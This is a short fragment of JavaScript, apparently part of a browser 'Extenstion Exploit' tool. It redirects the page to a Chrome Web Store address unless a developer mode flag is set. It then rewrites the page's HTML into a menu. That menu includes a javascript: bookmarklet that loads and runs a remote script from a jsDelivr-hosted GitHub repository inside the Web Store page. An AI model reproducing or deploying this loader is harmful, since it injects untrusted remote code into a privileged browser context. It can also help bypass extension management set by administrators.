...
window.location.toString().startsWith('https://chrome.google.com/webstore') ||
  developerMode ||
  (window.location = 'https://chrome.google.com/webstoreexploit')
document.documentElement.innerHTML =
  ...
  isPageDev() +
  '>\n<div class="nav">\n<div class="nav-left">\n<div class="nav-title">Extenstion Exploit</div>\n<div class="nav-right">\n<div class="nav-dev">Developer mode</div>\n<a href="javascript:(function(){var a = document.createElement('script');a.src = `https://cdn.jsdelivr.net/gh/Dominato014/Files@main/extension3.js`;document.body.appendChild(a);}())">Link</a>\n<div ' +
  isButtonDev() +
